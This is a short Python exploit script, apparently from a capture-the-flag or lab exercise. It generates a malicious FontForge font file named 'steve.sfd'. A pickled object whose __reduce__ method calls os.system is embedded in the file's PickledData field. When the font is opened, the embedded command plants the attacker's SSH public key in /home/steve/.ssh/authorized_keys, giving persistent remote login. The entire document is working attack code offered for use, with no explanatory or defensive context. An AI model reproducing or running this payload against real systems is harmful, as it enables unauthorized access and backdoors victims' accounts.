import pickle
import os

# 1. PASTE YOUR FULL PUBLIC KEY HERE
PUB_KEY = "PUB_KEY"

# 2. The command we want Steve to run
cmd = f'mkdir -p /home/steve/.ssh && echo "{PUB_KEY}" > /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys'

class Pwn(object):
    def __reduce__(self):
        return (os.system, (cmd,))

# Package it up for FontForge
payload = pickle.dumps(Pwn(), protocol=0).decode('ascii')
escaped_payload = payload.replace('\n', '\\n').replace('"', '\\"')

sfd_content = f"""SplineFontDB: 3.2
FontName: PwnFont
PickledData: "{escaped_payload}"
BeginChars: 1114112 0
EndChars
EndSplineFont
"""

with open("steve.sfd", "w") as f:
    f.write(sfd_content)
print("[+] Created steve.sfd with direct SSH key payload")
